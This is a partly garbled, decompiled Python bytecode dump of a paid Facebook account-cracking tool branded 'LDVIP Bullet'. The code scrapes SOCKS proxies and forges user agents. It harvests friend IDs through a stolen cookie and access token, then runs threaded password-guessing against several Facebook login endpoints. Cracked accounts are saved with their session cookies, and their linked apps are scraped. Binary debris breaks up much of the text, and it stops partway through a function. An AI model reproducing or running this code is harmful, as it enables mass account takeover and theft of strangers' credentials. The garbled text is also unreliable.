o
    ?7?b ?  ?                   @   s?  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	zd dl
Z
W n' eyU   e?d? e?d? zd dl
Z
W n eyR   ed? Y nw Y nw d dlmZ d dlmZ d dlmZ d dlmZ d d	lmZ d d
lmZ d dlZe e?!d?? d dl"m#Z$ d dl%m&Z' d dl
m(Z) d dl
m*Z* d dl+m,Z- e*?.?  e? Z/g Z0g Z1g Z2e ?3? Z4g Z5ze ?6d?j7Z8e9dd??:e8? W n e;y? Z< z
e(d? W Y dZ<[<ndZ<[<ww e9dd??=? ?>? Z8e?d?D ]?Z@dZAe?Bdd?ZCe?Bdd?ZDdZEe?Bdd?Z<dZFe?Bdd?ZGe?Bdd?ZHe?Bdd?ZIe?Bdd?ZJdZKeA? eC? deD? d eE? e<? eF? eG? deH? deI? deJ? d eK? ?ZLe0?MeL? d!ZNe?Og d"??ZCd#ZDe?Og d$??ZEe?Bdd%?Z<e?Og d$??ZFd&ZGe?Bd'd?ZHd(ZIe?Bd)d*?ZJe?Bd+d,?ZKd-ZPeN? d eC? d.eD? eE? e<? eF? d/eG? eH? deI? deJ? deK? d eP? ?ZQe1?MeQ? q?e?d0?D ]`ZRd1ZAe?Bdd?ZCe?Bdd?ZDe?Og d$??ZEe?Og d$??Z<e?Og d$??ZFe?Og d$??ZGe?Bdd?ZHd2ZIe?Bdd?ZJe?Bdd?ZKd3ZPeA? eC? d4eD? eE? e<? eF? eG? eH? eI? eJ? deK? d eP? ?ZS?q?d5d6? ZLg g d d d g g g g g g g g f\ZTZUaVaWaXZYZZZ[Z\Z]Z^Z_Z`g Z2g g ZaZbd7d8? Zcec?  d9d:? Zdze?ed;? W n   Y e ?6d<??? Zfz
efd= Zgefd> ZhW n ei?ya   d Zgd ZhY nw d?Zjd@ZkdAZldBZmdCZndDZodEZpdFZqdGZrdHZRd@ZsdIZKdAZHdJZtdKZudLZvdEZCdMZwdNdOdPdQdRdSdTdUdVdWdXdYdZ?ZxdNdOdPdQdRdSdTdUdVdWdXd[d\?Zyej?z? j{Z|exe}ej?z? j~? Zej?z? j?Z?d]e}e|? d^ e}e? d^ e}e?? d_ Z?d`e}e|? d^ e}e? d^ e}e?? d_ Z?dadb? Z?dcdd? Z?dedf? Z?dgdh? Z?didj? Z?dkdl? Z?dmdn? Z?dodp? Z?dqdr? Z?dsdt? Z?dudv? Z?dwdx? Z?dydz? Z?d{d|? Z?d}d~? Z?dd?? Z?e?d?k?r\ze?d?? W n   Y ze?ed?? W n   Y ze?ed?? W n   Y ze?ed?? W n   Y e??  dS dS )??    Nzpip install rich?   zACannot Install Rich Module, Try Manual Install (pip install rich))?Table)?Console)?BeautifulSoup)?ThreadPoolExecutor)?Group)?Panels,   ZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhaw==)?Markdown)?Columns)?print)?pretty)?Textzwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz	.prox.txt?wu-   [[[1;92m•[1;97m] [[1;96mLDVIP_adijaya_xy?ri'  z!Mozilla/5.0 (Symbian/3; Series60/?	   ZNokia?d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/?   zMobile Safari/535.1?.? zMozilla/5.0 (Linux; U; Android)?6?7?8?9?10?11?12z en-us; GT-)?A?B?C?D?E?F?G?H?I?J?K?L?M?N?O?P?Q?R?S?T?U?V?W?X?Y?Zi?  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/?I   ?0ih  i$  ?(   ??   zMobile Safari/537.36z; z) ?
   z"Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-SzC; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/zMobile WVGA SMM-MMS/1.2.0 OPN-B?/c                  C   s?   zt dd??? ?? } | D ]}t?|? qW d S    t?d?j}t dd?} t?	dt
|??}|D ]	}| ?|d ? q/t dd??? ?? } Y d S )Nz	bbnew.txtr   z0https://github.com/EC-1709/a/blob/main/bbnew.txtz
.bbnew.txtr   zline">(.*?)<?
)?open?read?
splitlines?ugen?append?requests?get?text?re?findall?str?write)?uaZub?a?aaZun? rL   ?"/storage/emulated/0/Download/Ls.py?uaku\   s   ?
rN   c                  C   s?   t d? t d? tt?? ?tt?? ? } d?| ?}t d| ? z=t?d?j}||v r<t d? tt?? ?}t	?
d? W d S t d? t d	? t?d
| d ? td? t	?
d? t??  W d S    t??  tdkrnt?  Y d S Y d S )Nz$[1;97m	YOUR ID IS NOT YET APPROVED
z"        TOOL PRICE 20K | 2 WEEKS
?-z[37;1m     YOUR ID : zhttps://pastebin.com/7MHy9yFkz)[1;92m          APPROVAL IS DETECTED...!?   z,  IF PAYMENT IS SUCCESSFUL SEND YOUR ID...
z1[1;91m  FREE USERS FUK OFF DONT INBOX ME.[LDVIP]zLam start https://t.me/FFRFF3?text=Hi+LDVIP+i+Want+to+pay+for+Bullet+linces:+z
>/dev/nullr   ?__main__)r   rG   ?os?geteuid?getlogin?joinrB   rC   rD   ?time?sleep?systemZjeda?sys?exit?name?xoshnaw)?uuid?idZhttpCaht?msgrL   rL   rM   r\   m   s,   


?r\   c                  C   s0   zt d??? } t?| ? W d S    t?  Y d S )Nz.cookie.txt)r=   r>   ?cokbrutrA   ?login_lagi334)ZcokbrurL   rL   rM   ?cocok?   s
   rb   ?resultzhttp://ip-api.com/json/?queryZcountryz[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30mz[mz[93mz[32mz[95mz[33mz[0;34m?January?FebruaryZMarchZApril?MayZJuneZJulyZAugustZ	SeptemberZOctoberZNovemberZDecember)?1?2?3?4?5r   r   r   r   r   r   r   ZDevember)?01?02?03?04?05?06?07?08?09r   r   r   zOK-rO   z.txtzCP-c                   C   s   t ?d? d S )N?clear)rR   rX   rL   rL   rL   rM   rv   ?   s   rv   c                   C   s
   t ?  d S )N)?loginrL   rL   rL   rM   ?back?   s   
rx   c                   C   s   t ?  tdd ? d S )Nu?  %s
 ▄            ▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░▌          ▐░░░░░░░░░░▌ ▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░▌          ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌          ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░▌          ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░█▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ ▐░▌          ▐░░░░░░░░░░▌ 
 ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀            ▀▀▀▀▀▀▀▀▀▀  
                                                    

                                              
 
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m
	 [➣] OWNER  :        LDVIP DAVID
	 [➣] GITHUB :        LDVIP-KH3N	 
	 [➣] VERSION:        BULLET
	
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m
	
[0;91m       USE FLIGHT MODE FOR 3 SEC
[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m                                                                          r   )rv   r   rL   rL   rL   rM   ?banner?   s   
?ry   c                  C   s?   z`t dd??? } t dd??? }t?| ? z&tjdtd  d|id?}t?|j?d }t?|j?d	 }t	||? W W d S  t
yH   t?  Y W d S  tjjy`   t?  td
t ? t?  Y W d S w  tym   t?  Y d S w )N?
.token.txtr   ?.cok.txtz+https://graph.facebook.com/me?access_token=r   ?cookie??cookiesr[   r^   z %s# BAD INTERNET CONNECTION ! )r=   r>   ?tokenkurA   rB   rC   ?json?loadsrD   ?menu?KeyErrorra   ?
exceptions?ConnectionErrorry   r   r(   rZ   ?IOError)?token?cok?syZsy2Zsy3rL   rL   rM   rw   ?   s&   
??rw   c                  C   s?   t ?  zNtdttf ?} tjdddddddd	d
dd?	d| id?}t?d|j?}t	dd??
|?d??}t	dd??
| ?}td? t?d? td? t?d? t?  W d S  tyr } zt?d? tdt ? t?  W Y d }~d S d }~ww )Nu   %s [➣] ENTER COOKIE %sz0https://business.facebook.com/business_locationsz?Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36zhttps://www.facebook.com/zbusiness.facebook.comzhttps://business.facebook.comrh   ?#id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7?	max-age=0z?text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8ztext/html; charset=utf-8)	?
user-agent?referer?host?origin?upgrade-insecure-requests?accept-language?cache-control?accept?content-typer|   )?headersr~   z	(EAAG\w+)rz   r   r   r{   zFOOL LOGED IN SUCCESFULz
 run : python Bullet.pyz+xdg-open https://www.facebook.com/LDVIP.428?rm -f .cok.txtz%s# COOKIE DEAD)ry   ?inputr)   r(   rB   rC   rE   ?searchrD   r=   rH   ?groupr   rV   rW   rR   rX   rZ   ?	Exception)r|   ?dataZ
find_tokenZkenr?   ?erL   rL   rM   ra   ?   s"   (

??ra   c                 C   s?  z	t ?d??? }W n   ddi}Y t?  tdttf ? tdt|f ? tdttf ? td? tdttttf ? t?	d? tdtttttf ? t?	d? td	tttttf ? t?	d? td
tttttf ? t?	d? tdtttt
tf ? t?	d? ttd t d t d ?}|dv r?t?  d S |dv r?t?  d S |dv r?t?d? d S |dv r?t?d? d S |dv r?t?d? ttd t d t d ? t?	d? td? t?  d S td? t?  d S )Nzhttps://httpbin.org/ipr?   rO   u   %s[➣] ID  %s?/  [0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0m[0;0m-[0;0mz%s[%s01%s] %sPUBLIC CLONINGg{?G?z??z%s[%s02%s] %sBULK %sCRACKz%s[%s03%s] %sUPGRADE TO PRO%sz%s[%s04%s] %sSUB MY UTUBE%sz%s[%s06%s] %sLOGOUT%sr   ?[?   ➣z	]  LDVIP ?rh   rm   ?ri   rn   )rj   ro   zxdg-open https://t.me/FFRFF3)rk   rp   )r   rr   r?   z  [u   ]  HOLD●●●z# EXIT SUCCESSFULLYz# RETURN BACK TO MENU)rB   rC   r?   ry   r   r+   ?IP?CNrV   rW   r(   r)   r?   ?dump_publik?	multidumprR   rX   ?hrZ   )Zmy_nameZmy_id?shZjhrL   rL   rM   r?      s:       





r?   c               	   C   sL  z	t dd??? } W n ty   t?  Y nw td? ttd t d t d ? ttd t d t d ?}zJtjd| d	 t	d
  d| id??
? }|d d D ]}zt?|d d |d  ? W qP   Y qPttd t d t d ttt?? ? t?  W d S  tjjy?   td? t?  Y d S  ttfy?   td? t?  Y d S w )Nr{   r   r?   ? r?   r?   z] ENTER ID :? https://graph.facebook.com/v2.0/?)?fields=friends.limit(5000)&access_token=r   r|   r}   ?friendsr?   r^   ?|r[   z	] TOTAL: z# BAD INTERNET CONNECTIONz# WRONG ID NUMBER)r=   r>   r?   rZ   r   r+   r?   rB   rC   r   r?   r^   rA   rG   ?len?settingr?   r?   r?   )r?   ?pil?koh2?pirL   rL   rM   r?   #  s,   
?& 
(?r?   c               
   C   sf  z	t dd??? } W n ty   t?  Y nw zttdtttttf ??}W n   d}Y t|?D ]f}|d7 }t?  tdttt|tf ?}z2t	j
d| d td	  d
| id??? }|d d D ]}zt?|d d |d  ? W q^   Y q^W q0 t	jjy?   td? Y q0 ttfy?   td? t?  Y q0w t?  ttd t d t d ttt?? ? t?  d S )Nr{   r   u   %s[%s➣%s] ENTER LIMIT %s:%s i ??r   u#   [%s➣%s] ENTER PUBLIC ID %s%s%s : r?   r?   r   r|   r}   r?   r?   r^   r?   r[   u   [×] BAD INTERNET CONNECTION! u4   
 [×] ERROR RETRIEVING ID, PROBABLY ID IS NOT FOUNDr?   ?   •z
] TOTAL : )r=   r>   r?   rZ   ?intr?   r+   ?ranger   rB   rC   r   r?   r^   rA   r?   r?   r?   r?   rG   r?   r?   )r?   Z
nanya_keunZmnhr?   r?   r?   rL   rL   rM   r?   9  s4   
?& 
??(
r?   c            
      C   sj  t d? t d? t ?  ttd t d t d ?} | dv r*tt?D ]}t?|? q!nT| dv rWg }tt?D ]}|?|? q4t|?}|d }t|?D ]}t?|| ? |d8 }qHn'| d	v rotD ]}t	?
d
tt??}t?||? q]nd}t? ? t|dd?? t?  t d? t d? t ?  ttd t d t d ?}	|	dv r?t?d? n|	d	v r?t?d? nt?d? t?  d S )Nr?   z[01] LDVIP FAST
[02] LDVIP SLOWr?   r?   z] SELECT : rL   r?   r   r?   r   z# MENU?WHITE??stylez[01]LDVIP FAST
[02]LDVIP SLOWz]  : ?mobile?mbasic)r   r?   r+   ?sortedr^   ?id2rA   r?   r?   ?random?randint?insert?sol?markrZ   ?x?p?method?passwrd)
?huZtuaZmudaZbacotZbcmZbcmiZxmud?xxZricZhcrL   rL   rM   r?   U  sH   ?
??

r?   c                  C   st  t d? tdd???} tD ]?}|?d?d |?d?d ?? }}|?d?d }dg}t|?d	k rHt|?d
k r6n1|?ddd? |?d? |?d? nt|?d
k rT|?|? n|?|? g d?}|?d? |?d? dtv rvtD ]}|?|? qmn	 dt	v r?| ?
t||? qdt	v r?| ?
t||? q| ?
t||? qW d   ? n1 s?w   Y  t d? ttd t d t d ?}d S )Nr?   ?   )Zmax_workersr?   r   r   r   Zsayang?   ?   Z
1234512345Z19961996?20002000?
1122334455Z19991999)
r?   Z
1234554321Z112233445566Z123456654321r?   Z20012001Z20022002Z	199819998Z
1020304050Z102030405060Z19901990Z19951995?yar?   r?   r?   r?   r?   z!] THE PROCESS HAS BEEN COMPLETED )r   ?LDVIPr?   ?split?lowerr?   rA   ?pwpluss?pwnyar?   ?submit?crack?crackmbasicr?   r?   )?poolZyuzong?idfZnmfZfrs?pwvZxpwdZwoirL   rL   rM   r?     s@   "



??? r?   c                 C   s?  t j?dt? dt? t? t? dt? tt?? t? dt? dt? t? t? dt? dt	? d?
tttt?? ?? t? d??f t j??  t?t?}t?t?}t?? }|D ?]"}?zt?t?}dd| i}|j?d	d
dd|dddddd?
? |?d|  d ?}t?dt|j???d?t?dt|j???d?| dd|d?}	d?dd? |j?? ?? D ??}
|
d7 }
i dd	?d d
?d!d"?d#d?d$d%?d&d?d'd(?d)d*?d+|?d,d?d-d.?d/d?d0d?d1d?d2d|  d ?d3d4?d5d?}|j d6|	d7|
i|d8|d9?}d:|j?? ?!? v ?rt"d;t# d<??| d= | d> ? t$?%| d= | ? |d7 }W  nZd?|j?? ?!? v ?r^td7 a|j?? }d?d@d? |j?? ?? D ??}t&dAt? dB| ? dC|? d=|? t'? ?	? t"dDt( d<??| d= | d> ? W  nW qM tj)j*?yp   t+?,dE? Y qMw td7 ad S )FNz
 [LDVIP] r?   r;   ?] ?{:.0%}?]  ?httpz	socks4://zm.facebook.comr?   ??1rh   ??text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9?same-origin?cors?emptyr?   ?
?Hostr?   ?sec-ch-ua-mobiler?   r?   r?   ?sec-fetch-site?sec-fetch-mode?sec-fetch-destr?   z8https://m.facebook.com/login/device-based/password/?uid=ah  &flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr?name="lsd" value="(.*?)"r   ?name="jazoest" value="(.*?)"a"  https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified?login_no_pin?Zlsd?jazoest?uid?nextZflow?pass?;c                 S   ?   g | ]
\}}d ||f ?qS ?z%s=%srL   ??.0?key?valuerL   rL   rM   ?
<listcomp>?  ?    zcrack.<locals>.<listcomp>?  m_pixel_ratio=2.625; wd=412x756r?   r?   ?	sec-ch-ua?(" Not A;Brand";v="99", "Chromium";v="98"r?   ?sec-ch-ua-platform?	"Android"r?   r?   zhttps://m.facebook.comr?   ?!application/x-www-form-urlencodedr?   r?   ?x-requested-with?XMLHttpRequestr?   r?   r?   r?   ?accept-encoding?gzip, deflate, brr?   zQhttps://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_IDr|   F?r?   r~   r?   ?allow_redirects?proxies?
checkpoint?CP/rJ   r?   r<   ?c_userc                 S   r?   r?   rL   r?   rL   rL   rM   r?   ?  r?   ?z[LDVIP-OK] z | zOK/?   )-rY   ?stdoutrH   r+   ?loopr?   r^   r#   ?okr(   ?format?float?flushr?   ?choicer@   ?ugen2rB   ?Session?proxr?   ?updaterC   rE   r?   rG   rD   r?   rU   r~   ?get_dict?items?post?keysr=   ?cpc?akunrA   r   r)   ?okcr?   r?   rV   rW   )r?   r?   rI   ?ua2?ses?pw?nip?proxsr?   ?dataa?koki?heade?po?cp?coki?kukirL   rL   rM   r?   ?  sB   p




":r 
$ ?r?   c           !      C   s  t ?ttttttg?}td t	t
? }d}t ?t?}dd| i}t ?t?}t ?t?}t?? }	tj?d|tt	t
?ttt|?t|?tf ? tj??  |D ?]1}
?z|	j?dddd	|d
ddddd?
? |	?d|  d ?}t?dt|j???d?t?dt|j???d?| dd|
d?}d? dd? |j!?"? ?#? D ??}|d7 }i dd?dd?dd?d d?d!d"?d#d	?d$d%?d&d'?d(|?d)d
?d*d+?d,d?d-d?d.d?d/d|  d ?d0d1?d2d3?d4d5i?}|	j$d6|d7|i|d8|d9?}d:|j!?"? ?%? v ?rEd;t&v ?rt'?(| d< |
 ? t)| |
? n?d;t*v ?r?t+d=? d>| ? d?|
? ?}t,|d@dA?}t-t,|dBdC?? t.dDt/ dE??| d< |
 d= ? t'?(| d< |
 ? td7 anW qKW  ?n9dF|	j!?"? ?%? v ?rid(dGi}dHt0v ?r?|j!?"? }d? dId? |	j!?"? ?#? D ??}t.dJt1 dE??| d< |
 d< | d= ? t+d=? d>| ? dK|
? dL|? ?}t,|dMdA?}t-t,|dNdC?? td7 aW  n?d;t0v ?rh|j!?"? }d? dOd? |	j!?"? ?#? D ??}t.dJt1 dE??| d< |
 d< | d= ? | }dP}t?? }|jdQ||dR?j}|jdS||dR?j}|dT7 }t?2dUt|??}d}|D ]}|dV|? dW|dX ? dY|d ? dZ?7 }|d7 }?q?dX}|d[7 }t?2dUt|??} dX}| D ]}|d7 }|d\|? dW|dX ? dY|d ? d]?7 }?q't+d=? d^| ? dK|
? dL|? d_|? ?}t,|dMdA?}t-t,|d`dC?? td7 aW  nnW qKW qK tj3j4?y}   t5?6da? Y qKw td7 ad S )bNr   ?%r?   ?	socks5://z!%s  %s/%s  OK:%s  CP:%s  %s%s%s ?mbasic.facebook.comr?   r?   rh   r?   r?   r?   r?   r?   r?   z;https://free.facebook.com/login/device-based/password/?uid=?)&flow=login_no_pin&refsrc=deprecated&_rdrr?   r   r?   z,https://free.facebook.com/login/save-device/r?   r?   r?   c                 S   r?   r?   rL   r?   rL   rL   rM   r?   ?  r?   zcrackfree.<locals>.<listcomp>r?   r?   r?   r?   r?   r?   r?   r?   r?   r?   zhttps://free.facebook.comr?   r?   r?   r?   r?   r?   r?   r?   r?   r?   r   r  r?   z#ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7?
connection?closezFhttps://free.facebook.com/login/device-based/validate-password/?shbl=0r|   Fr  r  r?   r?   r<   ?   [•] ID       : ?    [•] PASSWORD : ?redr?   ?AOREC-XD CP??title?/sdcard/4MBF-DATA/CP/rJ   r  ??SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]?noc                 S   r?   r?   rL   r?   rL   rL   rM   r?   ?  r?   ?/sdcard/4MBF-DATA/OK/?   
[•] PASSWORD : ?   
[•] COOKIES  : ?green?AOREC-XD OKc                 S   r?   r?   rL   r?   rL   rL   rM   r?   ?  r?   r?   ?>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive?r~   r?   ?<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active?:   
[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] 
?`</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>?[bold cyan][r?   r   r   ?[/bold cyan]
?>   
[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]
?[bold yellow][?[/bold yellow]
?   [bold green][•] ID       : ?[/bold green]
?$[bold green]AOREC-XD OK[/bold green]r	  ?7r?   r  ?u?k?kk?br?   ?hhr  r?   r?   r  r@   r  rB   r  rY   r
  rH   r  r%  r?   rG   r?   r  r?   r  rC   rE   r?   rD   r?   rU   r~   r  r  r  r  ?oprekr  rA   ?ceker?princpr   ?nel?cetakr=   r  ?	taplikasir  rF   r?   r?   rV   rW   ?!r?   r?   ?biZpersZfffr  r   rI   r  r  r  r?   r!  r"  r#  r$  ?statuscp?	statuscp1?headappr&  r'  ?statusok?	statusok1?user?infoakun?session?cek2?cek?apkaktif?nok?muncul?hit?apkexprL   rL   rM   ?	crackfree?  ??   


6
":z

 


(

($(? ?!?rf  c           !      C   s  t ?ttttttg?}td t	t
? }d}t ?t?}dd| i}t ?t?}t ?t?}t?? }	tj?d|tt	t
?ttt|?t|?tf ? tj??  |D ?]1}
?z|	j?dddd	|d
ddddd?
? |	?d|  d ?}t?dt|j???d?t?dt|j???d?| dd|
d?}d? dd? |j!?"? ?#? D ??}|d7 }i dd?dd?dd?d d?d!d"?d#d	?d$d%?d&d'?d(|?d)d
?d*d+?d,d?d-d?d.d?d/d|  d ?d0d1?d2d3?d4d5i?}|	j$d6|d7|i|d8|d9?}d:|j!?"? ?%? v ?rEd;t&v ?rt'?(| d< |
 ? t)| |
? n?d;t*v ?r?t+d=? d>| ? d?|
? ?}t,|d@dA?}t-t,|dBdC?? t.dDt/ dE??| d< |
 d= ? t'?(| d< |
 ? td7 anW qKW  ?n9dF|	j!?"? ?%? v ?rid(dGi}dHt0v ?r?|j!?"? }d? dId? |	j!?"? ?#? D ??}t.dJt1 dE??| d< |
 d< | d= ? t+d=? d>| ? dK|
? dL|? ?}t,|dMdA?}t-t,|dNdC?? td7 aW  n?d;t0v ?rh|j!?"? }d? dOd? |	j!?"? ?#? D ??}t.dJt1 dE??| d< |
 d< | d= ? | }dP}t?? }|jdQ||dR?j}|jdS||dR?j}|dT7 }t?2dUt|??}d}|D ]}|dV|? dW|dX ? dY|d ? dZ?7 }|d7 }?q?dX}|d[7 }t?2dUt|??} dX}| D ]}|d7 }|d\|? dW|dX ? dY|d ? d]?7 }?q't+d=? d^| ? dK|
? dL|? d_|? ?}t,|dMdA?}t-t,|d`dC?? td7 aW  nnW qKW qK tj3j4?y}   t5?6da? Y qKw td7 ad S )bNr   r(  r?   r)  u0   %s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬ztouch.facebook.comr?   r?   rh   r?   r?   r?   r?   r?   r?   z<https://touch.facebook.com/login/device-based/password/?uid=r+  r?   r   r?   z-https://touch.facebook.com/login/save-device/r?   r?   r?   c                 S   r?   r?   rL   r?   rL   rL   rM   r?   /  r?   z